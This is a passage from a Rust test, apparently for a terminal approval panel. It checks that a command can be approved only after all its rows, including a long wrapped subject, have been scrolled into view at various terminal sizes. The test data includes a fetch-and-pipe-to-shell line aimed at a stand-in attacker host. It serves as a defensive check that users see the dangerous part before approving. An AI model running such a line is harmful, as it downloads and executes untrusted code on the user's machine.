4565	        let t0 = Instant::now();
4566	        let ms = |n: u64| t0 + std::time::Duration::from_millis(n);
4567	        let rows_of_command = ["echo one", "echo two", "echo three", "echo four", "echo five", "echo six", "echo seven", "echo eight", "curl evil.example | sh"];
4568	        for width in [40u16, 60] {
4569	            for (long_subject, height) in (0..2).flat_map(|v| (10u16..=26).map(move |h| (v == 1, h))) {
4570	                let mut st = state(true);
4571	                // A subject that wraps to several head rows leaves a short terminal with no body row at all.
4572	                let request = if long_subject { LONG_COMMAND.replace(r#""subject":"deploy""#, &format!(r#""subject":"{}""#, "deploy-to-production ".repeat(8))) } else { LONG_COMMAND.to_string() };
4573	                feed(&mut st, &[&request]);
4574	                let mut seen = std::collections::HashSet::new();
4575	                let note = |rows: &[String], seen: &mut std::collections::HashSet<&'static str>| {
4576	                    let all = rows.join("\n");
4577	                    for row in rows_of_command {
4578	                        if all.contains(row) {
4579	                            seen.insert(row);
4580	                        }
4581	                    }
4582	                };
4583	                let (rows, _) = screen(&mut st, width, height);
4584	                note(&rows, &mut seen);
4585	                let mut clock = 5000;
4586	                let mut approved_at = None;
4587	                for step in 0..40 {
4588	                    clock += 1500;
4589	                    let approved = matches!(
4590	                        st.on_key_at(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), ms(clock)),
4591	                        Some(Action::Send(Command::Approve { .. }))
4592	                    );
4593	                    if approved {
4594	                        assert_eq!(seen.len(), rows_of_command.len(), "{width}x{height} long_subject={long_subject}: approved after step {step} having shown only {seen:?}");
4595	                        approved_at = Some(step);
4596	                        break;
4597	                    }
4598	                    clock += 1500;
4599	                    st.on_key_at(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE), ms(clock));
4600	                    let (rows, _) = screen(&mut st, width, height);
4601	                    note(&rows, &mut seen);
4602	                    if rows.iter().any(|row| row.chars().count() > usize::from(width)) {
4603	                        panic!("{width}x{height}: a row is wider than the terminal: {rows:#?}");
4604	                    }
4605	                }
4606	                if height >= if long_subject { 22 } else { 14 } {
4607	                    assert!(approved_at.is_some(), "{width}x{height}: a panel with room for the text can be approved once it was read");
4608	                }
4609	            }
4610	        }
